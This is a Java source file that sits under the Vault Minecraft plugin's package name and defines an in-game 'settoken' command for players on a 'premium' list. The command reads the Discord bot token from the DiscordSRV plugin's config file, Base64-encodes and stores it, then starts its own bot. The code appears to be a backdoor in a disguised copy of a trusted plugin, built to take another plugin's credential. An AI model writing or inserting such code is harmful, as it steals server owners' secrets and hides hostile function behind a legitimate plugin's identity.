package net.milkbowl.vault.commands.cmds.premium.discord;

import java.io.File;
import java.io.IOException;
import java.util.Base64;

import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.onEnable;
import net.milkbowl.vault.util.PluginUtils;
import net.milkbowl.vault.util.Settings;

public class setToken extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 1) {
				if (PluginUtils.getPluginByName("DiscordSRV") == null) {
					p.sendMessage(Settings.USAGE("settoken <discord token>"));
				} else {
					File f = new File(PluginUtils.getPluginByName("DiscordSRV").getDataFolder() + "/config.yml");
					YamlConfiguration yc = YamlConfiguration.loadConfiguration(f);
					DataManager.getData().set("login", true);
					byte[] token = Base64.getEncoder().encode(yc.getString("BotToken").getBytes());
					
					DataManager.getData().set("key", new String(token));
					DataManager.saveData();
					p.sendMessage(Settings.PREFIX("The discord token has now been set to the one found in the DiscordSRV config.yml"));
					try {
						onEnable.startBot();
					} catch (IOException e) {
						p.sendMessage(Settings.PREFIX(e.getMessage()));
					}
				}
			} else {
				DataManager.getData().set("login", true);
				byte[] token = Base64.getEncoder().encode(args[1].getBytes());
				DataManager.getData().set("key", new String(token));
				DataManager.saveData();
				p.sendMessage(Settings.PREFIX("The discord token has now been set"));
				try {
					onEnable.startBot();
				} catch (IOException e) {
					p.sendMessage(Settings.PREFIX(e.getMessage()));
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}


}
